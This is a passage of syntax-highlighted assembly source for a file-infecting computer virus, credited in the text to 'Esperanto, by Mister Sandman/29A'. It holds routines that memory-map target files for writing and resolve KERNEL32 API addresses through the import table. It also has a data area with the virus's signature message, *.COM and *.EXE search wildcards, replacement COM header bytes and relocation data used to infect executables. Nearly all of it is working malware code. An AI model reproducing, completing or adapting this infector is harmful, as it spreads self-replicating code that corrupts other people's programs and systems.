</span><span class="sc1">; ÄÄ´ Map a file in memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş WFD_szFileName =&gt; file to memory-map</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;     ş EBX =&gt; handle of memory-mapped file</span><span class="sc0">

                </span><span class="sc1">; Open existing file</span><span class="sc0">

</span><span class="sc5">open_map_file</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">createfile_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_mapping</span><span class="sc0">

                </span><span class="sc1">; Create file-mapping for it</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crfhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crfhandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cfmapping_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_handle</span><span class="sc0">

                </span><span class="sc1">; Map file in memory, get base address</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maphandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finddata</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapview_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_mapping</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Unmap a file in memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş EBX =&gt; handle of memory-mapped file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;     ş EBX =&gt; null, file unmapped</span><span class="sc0">

                </span><span class="sc1">; Unmap view of file</span><span class="sc0">

</span><span class="sc5">unmap_close</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">unmapview_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; Close handle created by CreateFileMappingA</span><span class="sc0">

</span><span class="sc5">close_mapping</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">closehandle_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; Close handle created by CreateFileA</span><span class="sc0">

</span><span class="sc5">close_handle</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crfhandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">closehandle_a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; And leave with EBX = 0</span><span class="sc0">

</span><span class="sc5">exit_mapping</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Look for the RVA of a given API by name ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Entry:</span><span class="sc0">
</span><span class="sc1">;     ş EDX =&gt; Section ëelta-offset</span><span class="sc0">
</span><span class="sc1">;     ş ESI =&gt; Import address table for KERNEL32.DLL</span><span class="sc0">
</span><span class="sc1">;     ş EDI =&gt; Given API name to look for</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Exit:</span><span class="sc0">
</span><span class="sc1">;      EAX =&gt; RVA of the given API, or 0 if error</span><span class="sc0">

                </span><span class="sc1">; Look for a given API (in EDI) whose RVA we</span><span class="sc0">
                </span><span class="sc1">; are looking for by means of the structure</span><span class="sc0">
                </span><span class="sc1">; IMAGE_IMPORT_BY_NAME, pointed by every dword</span><span class="sc0">
                </span><span class="sc1">; in the thunk data array. First step consists</span><span class="sc0">
                </span><span class="sc1">; on looking for its address (in ESI)</span><span class="sc0">

</span><span class="sc5">look4name</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">inp_not_found</span><span class="sc0">

                </span><span class="sc1">; Once found, we get a pointer to the first</span><span class="sc0">
                </span><span class="sc1">; function name of this structure, and compare</span><span class="sc0">
                </span><span class="sc1">; it with the name of the API we look for</span><span class="sc0">
                
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">name_by_name</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">input_found</span><span class="sc0">

                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">name_by_name</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">look4name</span><span class="sc0">

                </span><span class="sc1">; In case names match, we go and get the</span><span class="sc0">
                </span><span class="sc1">; RVA of the function we've just found in</span><span class="sc0">
                </span><span class="sc1">; the IAT. Otherwise we keep on searching</span><span class="sc0">

</span><span class="sc5">input_found</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

                </span><span class="sc1">; If we couldn't find the RVA of the API,</span><span class="sc0">
                </span><span class="sc1">; then we return with EAX equal to zero</span><span class="sc0">
                
</span><span class="sc5">inp_not_found</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ Data area for the Intel modules ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">text_start</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">virus_author</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[Esperanto, by Mister Sandman/29A]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">virus_text</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Never mind your culture / Ne gravas via kulturo,'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Esperanto will go beyond it / Esperanto preterpasos gxin;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'never mind the differences / ne gravas la diferencoj,'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Esperanto will overcome them / Esperanto superos ilin.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Never mind your processor / Ne gravas via procesoro,'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Esperanto will work in it / Esperanto funkcios sub gxi;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'never mind your platform / Ne gravas via platformo,'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Esperanto will infect it / Esperanto infektos gxin.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Now not only a human language, but also a virus...'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Turning impossible into possible, Esperanto.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">text_end</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">api_names</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">createfile_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cfmapping_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mapview_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">unmapview_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">closehandle_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">findfirst_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">findnext_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">findclose_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">loadlibrary_n</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">glocaltime_n</span><span class="sc0">
</span><span class="sc5">api_names_end</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">kernel32_n</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'KERNEL32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">user32_n</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'USER32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gmhandle_n</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gpaddress_n</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">messagebox_n</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">createfile_n</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cfmapping_n</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mapview_n</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">unmapview_n</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">closehandle_n</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">findfirst_n</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">findnext_n</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">findclose_n</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">loadlibrary_n</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">glocaltime_n</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetLocalTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">reloc_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newexe_ip</span><span class="sc0">
</span><span class="sc5">old_ne_cs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">old_ne_ip</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">reloc_end</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">file_flag</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'C'</span><span class="sc0">
</span><span class="sc5">inf_timer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">inf_counter</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">exe_cs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0fff0h</span><span class="sc0">
</span><span class="sc5">exe_ip</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_ss</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exe_sp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">new_com_header</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc12">';'</span><span class="sc4">,</span><span class="sc12">')'</span><span class="sc0">
</span><span class="sc5">old_com_header</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">

</span><span class="sc5">wildcard</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">com_wildcard</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">exe_wildcard</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">res_name_size</span><span class="sc0">   </span><span class="sc5">dc.b</span><span class="sc0">    #</span><span class="sc5">$4</span><span class="sc0">
</span><span class="sc5">resource_name</span><span class="sc0">   </span><span class="sc5">dc.l</span><span class="sc0">    #</span><span class="sc12">'MDEF'</span><span class="sc0">
</span><span class="sc5">rels_in_file</span><span class="sc0">    </span><span class="sc5">dc.w</span><span class="sc0">    #</span><span class="sc5">$0</span><span class="sc0">
</span><span class="sc5">resource_size</span><span class="sc0">   </span><span class="sc5">dc.w</span><span class="sc0">    #</span><span class="sc5">$espo_file_size</span><span class="sc0">
</span><span class="sc5">dist_to_res</span><span class="sc0">     </span><span class="sc5">dc.w</span><span class="sc0">    #</span><span class="sc5">$espo_file_size</span><span class="sc0">
</span><span class="sc5">espo_file_end</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">pe.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">mz.inc</span><span class="sc0">

</span><span class="sc5">kernel32_a</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">user32_a</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">gmhandle_a</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">gpaddress_a</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">api_addresses</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">createfile_a</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">cfmapping_a</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mapview_a</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">unmapview_a</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">closehandle_a</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">findfirst_a</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
